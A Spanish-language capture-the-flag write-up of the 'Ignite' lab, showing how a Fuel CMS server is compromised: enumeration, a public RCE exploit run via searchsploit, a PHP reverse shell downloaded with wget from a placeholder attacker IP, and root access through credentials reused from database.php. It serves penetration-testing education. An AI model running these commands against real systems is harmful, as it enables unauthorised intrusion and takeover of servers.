# Ignite

## 🖥️ Sistema

Linux

---

## 🎯 Objetivo del laboratorio

Comprometer una máquina Linux explotando una vulnerabilidad **RCE** en **Fuel CMS**, obtener una shell sobre el servidor y escalar privilegios recuperando las credenciales almacenadas en los archivos de configuración hasta conseguir acceso como **root**.

---

## 🛠️ Tecnologías trabajadas

- Fuel CMS
- SearchSploit
- Remote Code Execution (RCE)
- Python HTTP Server
- PHP Reverse Shell
- wget

---

## 🧠 Metodología

La enumeración inicial mostró que únicamente el puerto **80** estaba expuesto, por lo que toda la investigación debía centrarse en la aplicación web.

Durante la exploración aparecieron rápidamente varias pistas importantes: un panel de administración de **Fuel CMS** y unas credenciales por defecto expuestas. En lugar de intentar explotar manualmente la aplicación, decidí comprobar si existían vulnerabilidades públicas conocidas para esa versión del CMS.

La búsqueda en SearchSploit confirmó la existencia de un **Remote Code Execution**, lo que permitió obtener ejecución de comandos directamente sobre el servidor. A partir de ese punto, el siguiente objetivo fue transformar esa ejecución limitada en una shell completamente interactiva para facilitar la post-explotación.

La escalada de privilegios no requirió explotar ninguna vulnerabilidad adicional. En su lugar, consistió en revisar cuidadosamente los archivos de configuración de Fuel CMS, donde se almacenaban credenciales reutilizadas por el usuario **root**.

Este laboratorio demuestra cómo una aplicación desactualizada y una mala gestión de credenciales pueden comprometer completamente un servidor.

---

## 🚀 Explotación

### 1. Enumeración inicial

Comencé comprobando la conectividad con la máquina mediante `ping` y confirmé que se trataba de un sistema Linux gracias al TTL obtenido.

Posteriormente realicé un escaneo completo utilizando Nmap.

```bash
nmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn 10.10.221.150
```

Se descubrió un único servicio:

| Puerto | Servicio |
|---------|----------|
| 80 | HTTP |

---

### 2. Enumeración web

Durante la navegación encontré el archivo:

```
robots.txt
```

Este recurso revelaba la existencia del directorio:

```
/fuel
```

Además, proporcionaba las credenciales por defecto:

```
admin:admin
```

Con ellas accedí al panel de administración de **Fuel CMS**.

Posteriormente realicé una enumeración adicional utilizando Dirb.

```bash
dirb http://10.10.221.150
```

La enumeración confirmó la estructura de la aplicación y permitió continuar con la investigación.

---

### 3. Explotación de Fuel CMS

Al identificar el CMS decidí comprobar si existían vulnerabilidades públicas conocidas.

Utilicé SearchSploit.

```bash
searchsploit fuel cms
```

Entre los resultados apareció un exploit de **Remote Code Execution (RCE)**.

Copié el exploit a mi directorio de trabajo y revisé su funcionamiento.

Posteriormente lo ejecuté indicando la dirección del servidor.

```bash
python3 50477.py -u http://10.10.221.150
```

El exploit permitió ejecutar comandos directamente sobre la máquina víctima.

---

### 4. Obtención del acceso inicial

Aunque ya disponía de ejecución remota de comandos, preferí obtener una shell completamente interactiva.

Preparé una **reverse shell** en PHP y la compartí temporalmente mediante un servidor HTTP.

```bash
python3 -m http.server 80
```

Desde la máquina víctima descargué el archivo utilizando:

```bash
wget http://<IP_ATACANTE>/shell.php
```

Finalmente ejecuté la reverse shell.

```bash
php shell.php
```

Tras preparar un listener con Netcat recibí una conexión correctamente.

El usuario comprometido era:

```
www-data
```

Durante la exploración localicé la primera flag:

```
user.txt
```

---

### 5. Enumeración interna

El siguiente paso consistió en revisar los usuarios existentes.

```bash
cat /etc/passwd
```

No existían usuarios especialmente interesantes aparte de **root**.

Recordando que la propia página principal indicaba dónde se almacenaban los archivos de configuración de la base de datos, revisé el siguiente directorio:

```
/var/www/html/fuel/application/config
```

Dentro encontré el archivo:

```
database.php
```

---

### 6. Escalada de privilegios

Al revisar el contenido de `database.php` aparecieron las credenciales utilizadas por la aplicación.

Estas credenciales coincidían con la contraseña del usuario **root** del sistema.

Simplemente inicié sesión utilizando:

```bash
su root
```

Tras autenticarme correctamente accedí al directorio:

```
/root
```

y recuperé la última flag del laboratorio.

---

## 📚 Lecciones aprendidas

- Este laboratorio permitió comprender cómo una aplicación vulnerable puede comprometer completamente un sistema cuando además almacena credenciales sensibles de forma insegura.
- Identificar instalaciones vulnerables de **Fuel CMS**.
- Buscar exploits públicos utilizando **SearchSploit**.
- Ejecutar vulnerabilidades **Remote Code Execution (RCE)**.
- Compartir archivos temporalmente mediante un servidor HTTP con Python.
- Transferir archivos desde la máquina víctima utilizando `wget`.
- Obtener una shell interactiva a partir de una ejecución remota de comandos.
- Localizar archivos de configuración críticos dentro de aplicaciones web.
- Recuperar credenciales reutilizadas para escalar privilegios.

### Reflexión

La principal enseñanza de esta máquina fue comprobar que muchas aplicaciones web almacenan información extremadamente sensible dentro de sus archivos de configuración. Aunque la vulnerabilidad RCE proporcionó la ejecución inicial de comandos, el compromiso completo del sistema fue posible gracias a la reutilización de credenciales entre la aplicación y el sistema operativo. Además, este laboratorio reforzó la importancia de utilizar herramientas como **SearchSploit** para identificar rápidamente vulnerabilidades conocidas en servicios y CMS detectados durante la fase de enumeración.
